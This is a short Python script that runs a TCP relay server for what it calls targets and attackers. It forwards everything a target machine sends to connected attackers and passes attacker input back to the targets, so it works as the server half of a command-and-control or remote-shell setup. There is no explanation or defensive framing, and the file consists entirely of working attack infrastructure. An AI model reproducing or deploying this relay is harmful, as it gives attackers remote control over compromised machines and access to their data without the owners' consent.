import socket
import os
import threading

def get_IP():
	host_name = socket.gethostname()
	host_ip = socket.gethostbyname(host_name)
	return host_ip

IP = get_IP() 
PORT = 55555
addr = (IP, PORT)

target = []
attacker = []

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(addr)
s.listen()

def target_handling(target):
	target.settimeout(0.5)
	while True:
		try:
			target_recv = target.recv(1024)
			print(target_recv)
			for att in attacker:
				print("sending data")
				att.send(target_recv)
		except:
			pass


def attacker_handling(attacker):
	while True:
		try:
			attacker_recv = attacker.recv(1024)
			for tar in target:
				tar.send(attacker_recv)
		except:
			pass

def main():
	while True:
		client, addr = s.accept()
		print(f"New connection to {addr}")
		client_type = client.recv(1024).decode('ascii')
		if client_type == "T":
			target.append(client)
			thread = threading.Thread(target=target_handling, args=(client,))
			thread.start()
		elif client_type == "A":
			attacker.append(client)
			thread = threading.Thread(target=attacker_handling, args=(client,))
			thread.start()


main()
